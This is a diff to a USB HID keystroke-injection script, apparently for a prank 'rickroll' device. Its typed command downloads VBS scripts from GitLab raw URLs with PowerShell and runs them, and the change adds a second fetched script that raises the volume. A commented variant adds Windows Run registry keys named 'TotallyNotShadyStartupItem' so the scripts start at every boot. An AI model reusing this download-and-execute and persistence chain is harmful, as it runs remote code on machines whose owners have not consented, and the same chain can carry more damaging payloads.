@@ -8,7 +8,7 @@ ENTER
 DELAY 500
 ALT y
 DELAY 200
-STRING powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && exit
-REM powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\rickroll.vbs && exit
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/ef5da75dee758d0789932a2db5879b22ae45ab0f/volup.vbs','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && exit
+REM powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/ef5da75dee758d0789932a2db5879b22ae45ab0f/volup.vbs','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\volup.vbs && exit
 DELAY 200
 ENTER
